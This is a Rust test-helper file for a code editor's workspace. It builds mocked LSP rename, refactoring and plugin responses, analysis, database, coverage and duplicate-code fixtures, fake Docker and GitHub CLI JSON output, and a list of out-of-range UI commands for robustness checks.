fn importing(label: &str) -> LspCompletion {
    let mut offered = item(label);
    offered.resolve = Some("{\"label\":\"x\",\"data\":1}".into());
    offered
}

fn import_edit() -> LspTextEdit {
    LspTextEdit {
        start: (0, 0),
        end: (0, 0),
        text: "use std::collections::HashMap;\n".into(),
    }
}

impl Harness {
    fn ask_rename(&mut self, name: &str) {
        self.act(Action::RenameSymbol);
        while self
            .ws
            .file_prompt()
            .is_some_and(|p| !p.input.text().is_empty())
        {
            self.run(Command::DeleteBackward);
        }
        self.run(Command::Insert(name.to_owned()));
        self.run(Command::Newline);
    }

    fn answer_rename(&mut self, changes: Option<Vec<LspFileEdit>>) {
        let id = self.last_query();
        let places = changes
            .iter()
            .flatten()
            .flat_map(|f| {
                f.edits.iter().map(|e| LspUsage {
                    location: LspLocation {
                        path: f.path.clone(),
                        start: e.start,
                    },
                    disk_line: String::new(),
                })
            })
            .collect();
        self.lsp_event(Event::Lsp(LspEvent::Answered {
            server: rust_server(),
            id,
            result: Ok(LspAnswer::Rename { changes, places }),
        }));
    }
}

fn renamed_at(name: &str, at: (u32, u32), to: (u32, u32), text: &str) -> LspFileEdit {
    LspFileEdit {
        path: Path::new(ROOT).join(name),
        edits: vec![LspTextEdit {
            start: at,
            end: to,
            text: text.to_owned(),
        }],
    }
}

impl Harness {
    fn renamed_in_two_files() -> Self {
        let mut h = Harness::new(&[("a.rs", "foo"), ("b.rs", "foo")]);
        h.open("b.rs");
        h.ready("a.rs");
        h.ask_rename("baz");
        h.answer_rename(Some(vec![
            renamed_at("a.rs", (0, 0), (0, 3), "baz"),
            renamed_at("b.rs", (0, 0), (0, 3), "baz"),
        ]));
        h.run(Command::Insert("y".to_owned()));
        h
    }
}

fn plugin_info() -> PluginInfo {
    PluginInfo {
        name: "hello".to_owned(),
        commands: vec![PluginCommand {
            id: "say".to_owned(),
            title: "Say Hello".to_owned(),
        }],
    }
}

impl Harness {
    fn with_plugin(&mut self) {
        self.lsp_event(Event::PluginsLoaded {
            plugins: vec![plugin_info()],
            problems: Vec::new(),
        });
    }

    fn run_plugin(&mut self) -> Option<Effect> {
        self.act(Action::OpenPalette);
        self.run(Command::Insert("Plugin: Say Hello".to_owned()));
        self.run(Command::Newline);
        self.lsp
            .iter()
            .rev()
            .find(|e| matches!(e, Effect::RunPlugin { .. }))
            .cloned()
    }

    fn plugin_done(&mut self, result: Result<PluginReport, String>) {
        self.lsp_event(Event::PluginDone {
            plugin: "hello".to_owned(),
            result,
        });
    }
}

fn report(commands: Vec<Command>) -> PluginReport {
    PluginReport {
        commands,
        status: Some("Said hello".to_owned()),
    }
}

fn analysis_command(
    tool: crate::core::analysis::AnalysisTool,
) -> crate::core::analysis::AnalysisCommand {
    crate::core::analysis::AnalysisCommand {
        tool,
        program: PathBuf::from("/usr/bin/lint"),
        args: vec!["--json".to_owned()],
        from_project: false,
    }
}

fn analysis_finding(line: usize, message: &str) -> crate::core::analysis::Finding {
    crate::core::analysis::Finding {
        path: Path::new(ROOT).join("a.rs"),
        line,
        col: 2,
        severity: Severity::Warning,
        message: message.to_owned(),
    }
}

fn analysis_plan(approved: bool) -> Event {
    Event::Analysis(crate::core::analysis::AnalysisEvent::Planned {
        plan: crate::core::analysis::AnalysisPlan {
            commands: vec![analysis_command(
                crate::core::analysis::AnalysisTool::Clippy,
            )],
            missing: Vec::new(),
            approved,
        },
    })
}

fn analysis_started(effects: &[Effect]) -> bool {
    effects.iter().any(|e| {
        matches!(
            e,
            Effect::Analysis(crate::core::analysis::AnalysisEffect::Start { .. })
        )
    })
}

impl Harness {
    fn asked_analysis(&mut self) {
        let effects = self.ws.dispatch(Command::Run(Action::AnalyzeProject));
        assert!(
            effects.iter().any(|e| matches!(
                e,
                Effect::Analysis(crate::core::analysis::AnalysisEffect::Detect { .. })
            )),
            "the action only looks at what could run"
        );
    }
}

fn sqlite_connection(name: &str) -> crate::core::db::DbConnection {
    crate::core::db::DbConnection {
        name: name.to_owned(),
        endpoint: crate::core::db::DbEndpoint::Sqlite {
            path: "/data/a.db".into(),
        },
    }
}

impl Harness {
    fn sql(text: &str, connections: &[&str]) -> Self {
        let mut h = Harness::new(&[("q.sql", text)]);
        h.open("q.sql");
        h.ws.configure_databases(connections.iter().map(|n| sqlite_connection(n)).collect());
        h
    }

    fn db_sent(&mut self, command: Command) -> Option<(u64, String, bool)> {
        self.ws.dispatch(command).into_iter().find_map(|e| match e {
            Effect::Db(crate::core::db::DbEffect::Query {
                id,
                statement,
                read_only,
                ..
            }) => Some((id, statement, read_only)),
            _ => None,
        })
    }
}

fn hostile_commands() -> Vec<Command> {
    let far = usize::MAX;
    let mut list = vec![
        Command::TerminalSize {
            rows: 0,
            columns: 0,
        },
        Command::TerminalSize {
            rows: u16::MAX,
            columns: u16::MAX,
        },
        Command::TerminalInput(vec![0; 8]),
        Command::TerminalScroll { delta: isize::MIN },
        Command::SelectTerminalTab { index: far },
        Command::CloseTerminalTab { index: far },
        Command::ClaudeSize {
            rows: 0,
            columns: 0,
        },
        Command::ClaudeSize {
            rows: u16::MAX,
            columns: u16::MAX,
        },
        Command::ClaudeInput(vec![0; 8]),
        Command::ClaudeScroll { delta: isize::MAX },
        Command::OpenMenu { menu: far },
        Command::PickMenuItem { entry: far },
        Command::Indent,
        Command::Outdent,
        Command::Select(Motion::Right),
        Command::SelectTo {
            line: far,
            col: far,
        },
        Command::SelectWord,
        Command::Viewport { text_cols: 0 },
        Command::ResizeTool { rows: 0 },
        Command::ResizeTool { rows: u16::MAX },
        Command::ResizeProject { columns: 0 },
        Command::ResizeProject { columns: u16::MAX },
        Command::ToolRoom {
            rows: 0,
            min: 100,
            max: 0,
        },
        Command::OpenFile {
            path: PathBuf::from(""),
            at: Some((far, far)),
        },
        Command::FocusView {
            view: ViewId(u32::MAX),
            at: Some((far, far)),
        },
        Command::SelectTreeRow {
            path: PathBuf::from("/nowhere"),
            activate: true,
        },
        Command::SelectSearchResult {
            index: far,
            open: true,
        },
        Command::SelectPickerItem {
            index: far,
            accept: true,
        },
        Command::SelectHistoryEntry { index: far },
        Command::SelectProblem {
            index: far,
            open: true,
        },
        Command::SelectGitRow { index: far },
        Command::SelectRunTab { index: far },
        Command::SelectRunLine { line: far },
        Command::ScrollDatabase { delta: isize::MIN },
        Command::PickDatabaseRow {
            table: true,
            index: far,
        },
        Command::PickDatabaseRow {
            table: false,
            index: far,
        },
        Command::ScrollHttp { delta: isize::MIN },
        Command::ScrollRun { delta: isize::MIN },
        Command::ToggleBreakpointAt {
            view: ViewId(u32::MAX),
            line: far,
        },
        Command::ScrollDebugConsole { delta: isize::MIN },
    ];
    for part in [
        crate::core::debug::DebugPart::Frames,
        crate::core::debug::DebugPart::Variables,
        crate::core::debug::DebugPart::Console,
    ] {
        list.push(Command::SelectDebugRow {
            part,
            index: far,
            open: true,
        });
    }
    list
}

fn project_symbol(name: &str, file: &str, start: (u32, u32)) -> crate::core::ProjectSymbol {
    crate::core::ProjectSymbol {
        name: name.to_owned(),
        kind: "function".to_owned(),
        path: Path::new(ROOT).join(file),
        start,
    }
}

impl Harness {
    fn symbols_query(&self, fx: &[Effect]) -> Option<(u64, String)> {
        fx.iter().rev().find_map(|e| match e {
            Effect::QuerySymbols { id, query, .. } => Some((*id, query.clone())),
            _ => None,
        })
    }
}

impl Harness {
    fn pick_row(&mut self, name: &str) {
        self.run(Command::Insert(name.to_owned()));
        self.run(Command::Newline);
    }

    fn offer_refactorings(&mut self, offers: Vec<crate::core::RefactorOffer>) {
        self.act(Action::RefactorThis);
        let id = self.last_query();
        self.lsp_event(Event::Lsp(LspEvent::Answered {
            server: rust_server(),
            id,
            result: Ok(LspAnswer::Refactorings(offers)),
        }));
    }

    fn answer_safe_delete(&mut self, usages: Vec<LspUsage>) {
        let id = self.last_query();
        self.lsp_event(Event::Lsp(LspEvent::Answered {
            server: rust_server(),
            id,
            result: Ok(LspAnswer::SafeDeleteUsages(usages)),
        }));
    }
}

fn offer(title: &str, changes: &[(&str, (u32, u32), &str)]) -> crate::core::RefactorOffer {
    let action = code_action(title, changes);
    let places = action
        .changes
        .iter()
        .map(|c| LspUsage {
            location: LspLocation {
                path: c.path.clone(),
                start: c.edits[0].start,
            },
            disk_line: String::new(),
        })
        .collect();
    crate::core::RefactorOffer { action, places }
}

fn usage_at(name: &str, line: u32, col: u32) -> LspUsage {
    LspUsage {
        location: LspLocation {
            path: Path::new(ROOT).join(name),
            start: (line, col),
        },
        disk_line: String::new(),
    }
}

const TWO_FNS: &str =
    "fn keep() {}\n\n/// Docs.\n#[inline]\nfn gone() {\n    gone();\n}\n\nfn other() {}\n";

fn on_gone(h: &mut Harness) {
    h.run(Command::Move(Motion::Down));
    h.run(Command::Move(Motion::Down));
    h.run(Command::Move(Motion::Down));
    h.run(Command::Move(Motion::Down));
    h.run(Command::Move(Motion::Right));
    h.run(Command::Move(Motion::Right));
    h.run(Command::Move(Motion::Right));
    h.run(Command::Move(Motion::Right));
}

fn on_gone_from_top(h: &mut Harness) {
    h.run(Command::Move(Motion::Down));
    h.run(Command::Move(Motion::Down));
    h.run(Command::Move(Motion::Right));
    h.run(Command::Move(Motion::Right));
    h.run(Command::Move(Motion::Right));
    h.run(Command::Move(Motion::Right));
}

fn coverage_of(name: &str, lines: &[(u32, u64)]) -> crate::core::coverage::CoverageReport {
    let mut report = crate::core::coverage::CoverageReport::default();
    report
        .files
        .insert(Path::new(ROOT).join(name), lines.iter().copied().collect());
    report.source = PathBuf::from("lcov.info");
    report
}

impl Harness {
    fn coverage_loaded(&mut self, report: crate::core::coverage::CoverageReport) {
        self.lsp_event(Event::Coverage(
            crate::core::coverage::CoverageEvent::Read { result: Ok(report) },
        ));
    }

    fn active_doc_coverage(&self, line: usize) -> Option<bool> {
        let (_, d) = self.ws.active()?;
        self.ws.coverage_mark(d, line)
    }
}

fn two_places() -> crate::core::DuplicatesReport {
    let place = |name: &str, line| crate::core::DuplicateFragment {
        path: Path::new(ROOT).join(name),
        first_line: line,
        last_line: line + 3,
    };
    crate::core::DuplicatesReport {
        groups: vec![crate::core::DuplicateGroup {
            tokens: 60,
            fragments: vec![place("a.rs", 0), place("b.rs", 1)],
        }],
        files: 2,
        ..Default::default()
    }
}

impl Harness {
    fn duplicates_sent(&self) -> Option<(u64, bool)> {
        self.git.iter().rev().find_map(|e| match e {
            Effect::Duplicates(crate::core::DuplicatesEffect::Start { id, anonymize, .. }) => {
                Some((*id, *anonymize))
            }
            _ => None,
        })
    }
}

fn docker_runs(fx: &[Effect]) -> Vec<(u64, Vec<String>, bool)> {
    fx.iter()
        .filter_map(|e| match e {
            Effect::Cli(crate::core::cli::CliEffect::Run {
                id,
                tool: crate::core::cli::CliTool::Docker,
                args,
                in_project,
                ..
            }) => Some((*id, args.clone(), *in_project)),
            _ => None,
        })
        .collect()
}

fn docker_ws() -> Workspace {
    let (mut ws, _) = Workspace::new(PathBuf::from(ROOT));
    ws.configure_trust(Some(true));
    ws
}

fn docker_answer(ws: &mut Workspace, runs: &[(u64, Vec<String>, bool)]) {
    use crate::core::cli::CliOutcome;
    for (id, args, _) in runs {
        let text = match args[0].as_str() {
            "compose" => r#"{"services":{"web":{"image":"nginx"}}}"#,
            "ps" => {
                r#"{"ID":"abc","Names":"web-1","Image":"nginx","State":"running","Status":"Up"}"#
            }
            "images" => r#"{"ID":"f00","Repository":"nginx","Tag":"1","Size":"1MB"}"#,
            _ => "",
        };
        ws.handle(Event::Cli(crate::core::cli::CliEvent::Finished {
            tool: crate::core::cli::CliTool::Docker,
            id: *id,
            outcome: CliOutcome::Done(text.to_owned()),
        }));
    }
}

fn opened_docker() -> Workspace {
    let mut ws = docker_ws();
    let fx = ws.dispatch(Command::Run(Action::ShowDocker));
    let runs = docker_runs(&fx);
    assert_eq!(runs.len(), 3);
    docker_answer(&mut ws, &runs);
    ws
}

fn insert(ws: &mut Workspace, text: &str) -> Vec<Effect> {
    ws.dispatch(Command::Insert(text.to_owned()))
}

const GH_PR_LIST: &str =
    r#"[{"number":7,"title":"Fix","state":"OPEN","author":{"login":"a"},"headRefName":"fix"}]"#;
const GH_ISSUE_LIST: &str =
    r#"[{"number":9,"title":"Bug","state":"OPEN","author":{"login":"b"},"labels":[]}]"#;
const GH_PR_VIEW: &str = r#"{"number":7,"title":"Fix","state":"OPEN","author":{"login":"a"},"body":"text","url":"u","headRefName":"fix","headRefOid":"abc123","baseRefName":"main"}"#;

fn gh_runs(fx: &[Effect]) -> Vec<(u64, Vec<String>, Option<String>)> {
    fx.iter()
        .filter_map(|e| match e {
            Effect::Cli(crate::core::cli::CliEffect::Run {
                id,
                tool: crate::core::cli::CliTool::Gh,
                args,
                input,
                in_project: true,
                ..
            }) => Some((*id, args.clone(), input.clone())),
            _ => None,
        })
        .collect()
}

fn gh_answer(ws: &mut Workspace, mut runs: Vec<(u64, Vec<String>, Option<String>)>) {
    use crate::core::cli::CliOutcome;
    while let Some((id, args, _)) = runs.pop() {
        let line = args.join(" ");
        let text = if line == "api user" {
            r#"{"login":"me","email":"private@example.com"}"#
        } else if line.starts_with("repo view") {
            r#"{"nameWithOwner":"o/r","defaultBranchRef":{"name":"main"}}"#
        } else if line.starts_with("pr list") {
            GH_PR_LIST
        } else if line.starts_with("issue list") {
            GH_ISSUE_LIST
        } else if line.starts_with("pr view") {
            GH_PR_VIEW
        } else if line.starts_with("api repos/") {
            "[]"
        } else {
            ""
        };
        let fx = ws.handle(Event::Cli(crate::core::cli::CliEvent::Finished {
            tool: crate::core::cli::CliTool::Gh,
            id,
            outcome: CliOutcome::Done(text.to_owned()),
        }));
        runs.extend(gh_runs(&fx));
    }
}

fn opened_github() -> Workspace {
    let mut ws = docker_ws();
    let fx = ws.dispatch(Command::Run(Action::ShowGitHub));
    gh_answer(&mut ws, gh_runs(&fx));
    ws
}

fn opened_pr() -> Workspace {
    let mut ws = opened_github();
    let fx = ws.dispatch(Command::Newline);
    gh_answer(&mut ws, gh_runs(&fx));
    ws
}

fn gh_writes(fx: &[Effect]) -> Vec<String> {
    fx.iter()
        .filter_map(|e| match e {
            Effect::Cli(crate::core::cli::CliEffect::Run {
                tool: crate::core::cli::CliTool::Gh,
                args,
                write: true,
                ..
            }) => Some(args.join(" ")),
            _ => None,
        })
        .collect()
}

fn status_of(ws: &Workspace) -> String {
    ws.status().map_or_else(String::new, |s| s.text.clone())
}

fn on_branch(ws: &mut Workspace, name: &str) {
    ws.handle(Event::Git(GitEvent::StatusRead {
        branch: Some(name.to_owned()),
        top: None,
        files: Ok(Vec::new()),
        state: GitRepoState::default(),
    }));
}
